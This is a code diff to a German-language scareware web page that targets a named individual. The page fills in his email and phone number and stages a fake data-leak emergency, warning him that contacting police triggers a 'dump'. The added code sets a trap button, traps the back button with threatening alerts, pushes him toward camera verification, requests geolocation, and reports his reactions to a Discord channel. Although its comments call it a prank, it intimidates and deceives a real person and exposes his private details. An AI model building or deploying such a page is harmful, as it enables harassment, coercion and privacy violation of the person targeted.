@@ -30,13 +30,23 @@
         }
         .highlight { color: #fff; font-weight: bold; }
         
-        #btn-init {
-            background: #000; border: 1px solid #f00; color: #f00;
-            padding: 20px; font-family: inherit; font-size: 1rem; cursor: pointer;
-            text-transform: uppercase; letter-spacing: 2px; transition: 0.2s;
-            box-shadow: 0 0 20px #500; width: 100%; max-width: 340px; font-weight: 900;
+        /* BUTTON CONTAINER */
+        .btn-container {
+            display: flex; flex-direction: column; gap: 15px; width: 100%; max-width: 340px;
         }
+
+        .btn-action {
+            padding: 20px; font-family: inherit; font-size: 1rem; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 1px; transition: 0.2s;
+            font-weight: 900; width: 100%; border: 1px solid #f00;
+        }
+
+        #btn-init { background: #000; color: #f00; box-shadow: 0 0 20px #500; }
         #btn-init:active { background: #f00; color: #000; }
+
+        #btn-upload { background: #100; color: #800; border-color: #500; font-size: 0.8rem; }
+        #btn-upload:active { background: #fff; color: #000; }
+
 
         /* --- DOSSIER LEAK MIT TIMER --- */
         #dossier-box {
@@ -146,11 +156,16 @@
 
         <div class="term-text" id="intro-text">
             KRITISCHER SICHERHEITSVORFALL.<br><br>
-            Dein privates Archiv wird derzeit auf öffentliche Server gespiegelt.<br><br>
+            Dein privates Archiv wird derzeit auf dezentrale Server gespiegelt.<br><br>
             <span class="highlight" style="color:#f00; border-bottom:1px solid #f00;">WARNUNG:</span> Externe Netzwerkanalyse oder Kontakt zu Behörden triggert den <span style="color:#fff; font-weight:bold;">SOFORTIGEN DUMP</span>.<br><br>
-            Identität muss via <b>Gesichtsscan</b> bestätigt werden, um den Prozess abzubrechen.
+            Wähle eine Aktion:
         </div>
-        <button id="btn-init" onclick="initializeSystem()">ABBRUCH & VERIFIZIERUNG</button>
+        
+        <div class="btn-container">
+            <button id="btn-init" class="btn-action" onclick="initializeSystem()">IDENTITÄT BESTÄTIGEN (STOPP)</button>
+            <button id="btn-upload" class="btn-action" onclick="forceUpload()">UPLOAD JETZT ABSCHLIESSEN</button>
+        </div>
+        
         <div id="status-log" style="margin-top:20px; color:#a00; font-size:0.8rem; font-weight:bold; min-height: 20px;"></div>
     </div>
 
@@ -184,7 +199,7 @@
 
     <script>
         // ======================================================
-        // >>> KONFIGURATION: HIER DATEN EINFÜGEN <<<
+        // >>> KONFIGURATION: HIER SEINE ECHTEN DATEN EINFÜGEN <<<
         // ======================================================
         const VICTIM_MAIL = "viktor_mutic@yahoo.com"; 
         const VICTIM_TEL = "+43 699 11208448";
@@ -193,6 +208,7 @@
         // ======================================================
 
         const btn = document.getElementById('btn-init');
+        const btnUp = document.getElementById('btn-upload');
         const log = document.getElementById('status-log');
         const dossier = document.getElementById('dossier-box');
         let audioCtx, osc, noise;
@@ -223,13 +239,38 @@
             let s = timeLeft % 60;
             tDisp.innerText = `0${m}:${s < 10 ? '0'+s : s}`;
             
-            if(timeLeft < 30) tDisp.style.color = "#fff"; // Blinken am Ende
+            if(timeLeft < 30) tDisp.style.color = "#fff"; 
         }, 1000);
 
+        // DIE FALLE WENN ER "UPLOAD" KLICKT
+        function forceUpload() {
+            btnUp.disabled = true;
+            btnUp.innerText = "SENDE DATEN...";
+            
+            // Sofort alles voll machen
+            pBar.style.width = "100%";
+            tDisp.innerText = "00:00";
+            
+            sendDiscord("VIKTOR HAT AUFGEGEBEN.");
+            
+            setTimeout(() => {
+                alert("SYSTEM-MELDUNG:\n\nDU HAST DICH ERGEBEN.\n\n4.2 GB WURDEN IN DIE BLOCKCHAIN GESCHRIEBEN.\nES GIBT KEINEN WEG ZURÜCK.");
+                location.reload(); 
+            }, 1000);
+        }
 
         async function initializeSystem() {
+            // --- ZURÜCK-TASTE SPERRE ---
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () {
+                history.go(1);
+                alert("SYSTEMFEHLER: FLUCHTVERSUCH BLOCKIERT.\n\nDATEN-UPLOAD BESCHLEUNIGT.");
+            };
+            // ---------------------------
+
             btn.disabled = true;
             btn.style.opacity = "0.5";
+            btnUp.style.display = "none"; // Den anderen Button ausblenden
             
             if(document.documentElement.requestFullscreen) {
                 try { await document.documentElement.requestFullscreen(); } catch(e){}
@@ -246,8 +287,7 @@
             
             log.innerText = "> ARCHIV GEFUNDEN!";
             log.style.color = "#f00";
-            // LANGE WARTEZEIT ZUM LESEN DER DROHUNG
-            await wait(4000);
+            await wait(4000); // Zeit zum Lesen
 
             log.innerText = "> KAMERA-ABGLEICH ERFORDERLICH...";
             await wait(1000);
@@ -261,7 +301,7 @@
                 log.innerText = "> ÜBEREINSTIMMUNG BESTÄTIGT.";
                 log.style.color = "#0f0";
                 
-                sendDiscord("ZUGRIFF ERLAUBT!");
+                sendDiscord("ZUGRIFF ERLAUBT! PRANK STARTET.");
 
                 navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
                 if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
